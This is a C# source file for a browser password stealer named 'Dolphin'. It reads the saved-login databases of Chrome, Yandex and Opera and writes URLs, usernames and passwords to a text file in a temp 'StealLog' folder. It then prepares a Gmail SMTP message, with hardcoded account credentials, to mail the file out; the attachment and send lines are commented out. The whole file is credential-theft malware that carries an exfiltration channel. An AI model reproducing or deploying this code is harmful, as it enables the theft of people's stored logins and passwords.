using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;

namespace Dolphin
{
    class Program
    {
        static void Main(string[] args)
        {
            Directory.CreateDirectory(Path.GetTempPath() + "StealLog");
            string[] paths = {
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\Login Data",
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Yandex\YandexBrowser\User Data\Default\Login Data",
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Opera Software\Opera Stable\Login Data"
            };
            string pwd_text = "";
            foreach (string p in paths)
            {
                var pas = Password.ReadPass(p);
                if(File.Exists(p))
                {
                    pwd_text += "Stealer: \r\n\r\n";
                    foreach (var item in pas)
                    {
                        if((item.Item2.Length > 0) && (item.Item2.Length > 0))
                        {
                            pwd_text += "URL: " + item.Item1 + "\r\n" + "Login: " + item.Item2 + "\r\n" + "Password: " + item.Item3 + "\r\n";
                            pwd_text += "\r\n";
                        }
                    }
                }
            }
            if(File.Exists(Path.GetTempPath() + @"StealLog\Login Data"))
            {
                File.Delete(Path.GetTempPath() + @"StealLog\Login Data");
            }
            File.WriteAllText(Path.GetTempPath() + @"StealLog\Passwords.txt", pwd_text);

            MailAddress from = new MailAddress("pass@gmail.com", "Какая разница");
            MailAddress to = new MailAddress("anything@gmail.com");
            MailMessage msg = new MailMessage(from, to);
            msg.Subject = "Test stealing Passwords";
            msg.Body = "<h2>Test password Steal</h2>";
            msg.IsBodyHtml = true;
            //msg.Attachments.Add(new Attachment(Path.GetTempPath() + @"StealLog\Passwords.txt"));

            SmtpClient Smtp = new SmtpClient("smtp.gmail.com", 587);
            Smtp.Credentials = new NetworkCredential("pp16o1pp16o1@gmail.com", "1o16pp1o16pp");
            Smtp.EnableSsl = true;
            //Smtp.Send(msg);
            
        }
    }
}
